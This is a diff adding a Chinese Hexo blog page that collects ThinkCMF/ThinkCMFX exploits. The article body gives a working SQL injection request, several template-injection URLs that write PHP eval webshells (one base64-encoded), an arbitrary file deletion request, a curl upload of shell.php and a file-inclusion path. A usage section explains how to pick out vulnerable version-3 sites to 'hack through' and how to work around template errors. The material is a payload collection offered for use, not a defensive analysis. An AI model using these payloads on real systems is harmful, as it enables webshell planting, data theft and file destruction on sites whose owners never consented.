@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <meta name="description" content="ThinkCMF漏洞全集和 …持续收集,欢迎贡献     前台SQL注入:   需要普通用户权限，默认可注册paylaod:      12345678POST /ThinkCMFX/index.php?g=portal&amp;amp;m=article&amp;amp;a=edit_post HTTP/1.1Host: localhostConnection: closeCookie: PHPSESSID=k">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ALL BLUE">
+<meta property="og:url" content="http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/index.html">
+<meta property="og:site_name" content="ALL BLUE">
+<meta property="og:description" content="ThinkCMF漏洞全集和 …持续收集,欢迎贡献     前台SQL注入:   需要普通用户权限，默认可注册paylaod:      12345678POST /ThinkCMFX/index.php?g=portal&amp;amp;m=article&amp;amp;a=edit_post HTTP/1.1Host: localhostConnection: closeCookie: PHPSESSID=k">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2021-03-24T15:33:31.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="ALL BLUE">
+<meta name="twitter:description" content="ThinkCMF漏洞全集和 …持续收集,欢迎贡献     前台SQL注入:   需要普通用户权限，默认可注册paylaod:      12345678POST /ThinkCMFX/index.php?g=portal&amp;amp;m=article&amp;amp;a=edit_post HTTP/1.1Host: localhostConnection: closeCookie: PHPSESSID=k">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>ALL BLUE</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF缓存Getshell漏洞/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2021/07/16/01-CMS漏洞/ThinkCMS/CVE-2019-7580 thinkcmf-5.0.190111后台任意文件写入导致的代码执行/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&text="><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&is_video=false&description="><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&name=&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&t="><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkCMF漏洞全集和"><span class="toc-number">1.</span> <span class="toc-text">ThinkCMF漏洞全集和</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用说明"><span class="toc-number">1.1.</span> <span class="toc-text">使用说明</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">JYP</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-16T03:12:37.167Z" itemprop="datePublished">2021-07-16</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="ThinkCMF漏洞全集和"><a href="#ThinkCMF漏洞全集和" class="headerlink" title="ThinkCMF漏洞全集和"></a>ThinkCMF漏洞全集和</h2><blockquote>
+<p>…持续收集,欢迎贡献  </p>
+</blockquote>
+<ul>
+<li>前台SQL注入:  <blockquote>
+<p>需要普通用户权限，默认可注册<br>paylaod:  </p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ThinkCMFX/index.php?g=portal&amp;m=article&amp;a=edit_post HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 79</span><br><span class="line"></span><br><span class="line">post[id][0]=bind&amp;post[id][1]=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+-</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>还有以下可以测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">term:123</span><br><span class="line">post[post_title]:123</span><br><span class="line">post[post_title]:aaa</span><br><span class="line">post_title:123</span><br><span class="line">post[id][0]:bind</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<ul>
+<li>前台模版注入漏洞-可getshell四处  </li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 仅在Windows环境测试</span><br><span class="line"># 第一处  </span><br><span class="line">http://website/ThinkCMFX/index.php?g=Comment&amp;m=Widget&amp;a=fetch&amp;templateFile=/../public/index&amp;content=&lt;%3fphp+file_put_contents(&apos;m.php&apos;,&apos;&lt;%3fphp+eval($_POST[_])%3b&apos;);?&gt;&amp;prefix=</span><br><span class="line"># 第二处  </span><br><span class="line">http://website/ThinkCMFX/index.php?g=Api&amp;m=Plugin&amp;a=fetch&amp;templateFile=/../../../public/index&amp;content=&lt;%3fphp+file_put_contents(&apos;m.php&apos;,&apos;&lt;%3fphp+eval($_POST[_])%3b&apos;);?&gt;&amp;prefix=</span><br><span class="line"></span><br><span class="line"># 第三处  </span><br><span class="line">/index.php?a=fetch&amp;templateFile=public/index&amp;prefix=&apos;&apos;&amp;content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,&apos;&lt;?php phpinfo(); ?&gt;&apos;)&lt;/php&gt;</span><br><span class="line"></span><br><span class="line"># 第四处</span><br><span class="line">/index.php?a=fetch&amp;content=&lt;?php+file_put_contents(&quot;mrxn.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg==&quot;));</span><br></pre></td></tr></table></figure>
+<ul>
+<li><p>任意文件删除-只能windows删除  </p>
+<blockquote>
+<p>在用户上传头像处存在任意文件删除漏洞，发送如下数据包后，会删除网站根目录下一个名为 test.txt 的文件。（该漏洞仅能在 Windows 下触发）  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /ThinkCMFX/index.php?g=User&amp;m=Profile&amp;a=do_avatar&amp; HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0;</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">imgurl=..\..\..\test.txt</span><br></pre></td></tr></table></figure>
+</blockquote>
+</li>
+<li><p>任意文件上传  </p>
+<blockquote>
+<p>在 ThinkCMFX2.2.3 最终版中，存在一处任意文件上传（需要普通用户权限，默认可注册）<br><code>curl -F &quot;file=@/tmp/shell.php&quot; -X &quot;POST&quot; -b &#39;PHPSESSID=qekmttucmue6vv41kpdjghnkd0;&#39; &#39;http://127.0.0.1/ThinkCMFX/index.php?g=Asset&amp;m=Ueditor&amp;a=upload&amp;action=uploadfile&#39;</code></p>
+</blockquote>
+</li>
+<li><p>任意文件包含（读取数据库配置等等）<br><code>/index.php?a=display&amp;templateFile=README.md</code></p>
+</li>
+</ul>
+<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><blockquote>
+<p>thinkcmf 并没有死，并且有3版本与5版本这里提供一些方法，帮助你们辨别哪一些是可以日的，那一些事不行的。<br>1.看logo 3的logo是黄色的.<br>2.在网站url 后面输入 admin,如果页面是蓝色的表示是3的，可日穿之.<br>3.查看 README.md 在网站url后面输入README.md.<br>另外还有一个说明，你在实际操作的过程中，可能会遇到他一直报这个<code>模板不存在</code>错:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url:http://thinkcmf.test/index.php?g=Comment&amp;m=Widget&amp;a=fetch</span><br><span class="line">post:</span><br><span class="line">templateFile=/../public/index</span><br><span class="line">prefix=&apos;&apos;</span><br><span class="line">content=&lt;php&gt;file_put_contents(&apos;test.php&apos;,&apos;&lt;?php eval($_REQUEST[11]);&apos;)&lt;/php&gt;</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>请放心这并不是说明漏洞不可使用，而是说，这个模版不存在，你可以换一个html即可<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">例如：</span><br><span class="line">/../public/index</span><br><span class="line">/../public/exception</span><br><span class="line">/../data/index</span><br><span class="line">/../data/runtime/index</span><br><span class="line">/../plugins/Mobileverify/View/admin_index</span><br><span class="line">/../plugins/Mobileverify/View/index</span><br><span class="line">/../plugins/Mobileverify/View/widget</span><br><span class="line">/../plugins/Demo/View/admin_index</span><br><span class="line">/../plugins/Demo/View/index</span><br><span class="line">/../plugins/Demo/View/widget</span><br><span class="line">/../application/Install/View/Public/footer</span><br><span class="line">/../application/Install/View/Public/head</span><br><span class="line">/../application/Install/View/Public/header</span><br><span class="line">/../application/Common/index</span><br><span class="line">/../application/Portal/Lang/en-us/index</span><br><span class="line">/../application/Api/Lang/en-us/index</span><br><span class="line">/../application/Api/Lang/zh-cn/index</span><br><span class="line">/../application/Comment/Lang/en-us/index</span><br><span class="line">/../application/Comment/Lang/zh-cn/index</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">url:http://thinkcmf.test/index.php?g=Api&amp;m=Plugin&amp;a=fetch</span><br><span class="line">post:</span><br><span class="line">templateFile=/../../../public/index</span><br><span class="line">prefix=&apos;&apos;</span><br><span class="line">content=&lt;php&gt;file_put_contents(&apos;test1.php&apos;,&apos;&lt;?php eval($_REQUEST[11]);&apos;)&lt;/php&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">/../../../public/index</span><br><span class="line">/../../../public/exception</span><br><span class="line">/../../../data/index</span><br><span class="line">/../../../data/runtime/index</span><br><span class="line">/../../../plugins/Mobileverify/View/admin_index</span><br><span class="line">/../../../plugins/Mobileverify/View/index</span><br><span class="line">/../../../plugins/Mobileverify/View/widget</span><br><span class="line">/../../../plugins/Demo/View/admin_index</span><br><span class="line">/../../../plugins/Demo/View/index</span><br><span class="line">/../../../plugins/Demo/View/widget</span><br><span class="line">/../../../application/Install/View/Public/footer</span><br><span class="line">/../../../application/Install/View/Public/head</span><br><span class="line">/../../../application/Install/View/Public/header</span><br><span class="line">/../../../application/Common/index</span><br><span class="line">/../../../application/Portal/Lang/en-us/index</span><br><span class="line">/../../../application/Api/Lang/en-us/index</span><br><span class="line">/../../../application/Api/Lang/zh-cn/index</span><br><span class="line">/../../../application/Comment/Lang/en-us/index</span><br><span class="line">/../../../application/Comment/Lang/zh-cn/index</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>还有最后一句废话：模版注入对于linux 并不好用 : )  </p>
+</blockquote>
+<p>参考：<br><a href="https://xz.aliyun.com/t/3409" target="_blank" rel="noopener">https://xz.aliyun.com/t/3409</a><br><a href="https://xz.aliyun.com/t/3529" target="_blank" rel="noopener">https://xz.aliyun.com/t/3529</a><br><a href="https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0" target="_blank" rel="noopener">https://mochazz.github.io/2019/07/25/ThinkCMFX%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%90%88%E9%9B%86/#%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0</a></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ThinkCMF漏洞全集和"><span class="toc-number">1.</span> <span class="toc-text">ThinkCMF漏洞全集和</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#使用说明"><span class="toc-number">1.1.</span> <span class="toc-text">使用说明</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&text="><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&is_video=false&description="><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=&body=Check out this article: http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&title="><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&name=&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=http://allblue147.github.io/2021/07/16/01-CMS漏洞/ThinkCMS/ThinkCMF漏洞全集和/&t="><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2021
+    JYP
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'">
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
